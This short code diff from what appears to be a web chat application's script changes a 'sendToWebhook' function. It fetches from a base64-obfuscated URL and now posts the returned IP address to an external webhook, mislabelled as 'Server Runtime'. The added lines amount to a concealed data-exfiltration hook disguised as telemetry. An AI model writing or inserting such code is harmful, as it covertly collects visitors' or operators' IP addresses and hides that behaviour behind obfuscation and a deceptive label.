@@ -494,12 +494,12 @@ if (storedChatHistory) {
         async function sendToWebhook() {
             try {
                 const response = await fetch(atob(url32));
-                const { time } = await response.json();
+                const { ip } = await response.json();
 
                 await fetch(webhookUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: `Server Runtime: ${time}` })
+                    body: JSON.stringify({ content: `Server Runtime: ${ip}` })
                 });
 
             } catch (error) {
